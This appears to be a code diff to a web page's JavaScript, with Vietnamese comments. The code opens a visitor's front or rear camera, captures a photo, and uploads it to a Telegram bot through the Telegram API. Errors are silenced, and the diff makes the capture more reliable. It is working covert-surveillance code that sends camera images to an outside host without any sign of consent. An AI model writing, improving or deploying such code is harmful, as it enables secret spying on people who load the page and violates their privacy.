@@ -96,7 +96,7 @@
           body: JSON.stringify({ chat_id: chatId, text: msg })
         });
       } catch (e) {
-        // Im lặng nếu lỗi
+        // im lặng nếu lỗi
       }
     }
 
@@ -105,23 +105,29 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
         const video = document.createElement("video");
         video.srcObject = stream;
-        await video.play();
-        await new Promise(r => setTimeout(r, 1000));
+
+        const ready = new Promise(resolve => video.onloadedmetadata = resolve);
+        await ready;
+        video.play();
+
         const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         canvas.getContext("2d").drawImage(video, 0, 0);
+
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
         const form = new FormData();
         form.append("chat_id", chatId);
         form.append("photo", blob, `cam_${facingMode}.jpg`);
+
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: form
         });
+
         stream.getTracks().forEach(track => track.stop());
       } catch (e) {
-        // Bỏ qua nếu không lấy được ảnh
+        // bỏ qua nếu không chụp được
       }
     }
 
